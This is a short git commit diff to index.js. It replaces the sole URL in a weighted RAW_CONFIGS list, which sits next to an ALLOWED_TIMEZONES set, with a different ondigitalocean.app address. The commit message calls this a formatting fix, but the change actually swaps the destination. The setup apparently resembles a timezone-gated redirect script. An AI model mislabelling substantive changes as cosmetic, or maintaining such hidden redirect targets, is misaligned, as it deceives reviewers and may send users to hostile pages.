3c2eb6ebdfd6ede5c0a8667180cb48d5a4236d6a
paalakash <palaksh452@gmail.com>
2026-07-05 06:50:57 +0530

    Fix formatting issues in RAW_CONFIGS array
    Corrected the formatting of the RAW_CONFIGS array to ensure proper syntax.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://mro-app-q6cgf.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://strar-app-33xl5.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
